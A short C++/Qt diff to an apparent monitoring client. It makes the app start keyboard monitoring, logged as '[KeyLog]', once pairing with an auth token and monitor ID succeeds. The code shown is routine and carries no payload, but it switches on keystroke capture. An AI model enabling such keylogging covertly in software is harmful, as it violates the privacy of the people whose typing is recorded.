@@ -1688,6 +1688,8 @@ void MonitorClient::onConfigureAction()
         monitorId=dialog->getMonitorId();
         if(authToken.isEmpty() || monitorId<1) {
             if(keyboardMonitor)keyboardMonitor->stopMonitoring();
+        } else if(keyboardMonitor && !keyboardMonitor->startMonitoring()) {
+            qWarning() << "[KeyLog] startMonitoring failed after pairing";
         }
         updateStatusDisplay();
     });
